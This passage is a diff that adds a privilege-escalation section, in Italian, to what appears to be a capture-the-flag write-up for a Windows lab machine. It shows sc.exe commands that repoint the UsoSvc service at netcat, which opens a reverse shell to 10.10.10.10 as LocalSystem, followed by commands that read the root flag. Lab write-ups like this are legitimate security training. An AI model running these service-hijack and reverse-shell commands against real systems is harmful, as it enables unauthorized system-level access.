@@ -84,3 +84,37 @@ msf5 > sessions -i Y
 Avrò una sessione con meterpreter! Adesso prelevo lo user flag! 
 
 ## Privilege Escalation
+
+
+Sfruttando "PayloadsAllTheThings" cercando per la CVE rintracciata all'interno della macchina con WinPEAS trovo:
+
+```
+C:\Windows\system32> sc.exe stop UsoSvc
+PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe qc usosvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: usosvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+
+PS C:\Windows\system32> sc.exe start UsoSvc
+```
+
+Quindi stampo il flag di root:
+
+```
+sc.exe stop UsoSvc
+sc.exe config UsoSvc binpath= "type \c C:\Users\Administrator\root.txt"
+sc.exe qc usosvc
+sc.exe start UsoSvc
+```
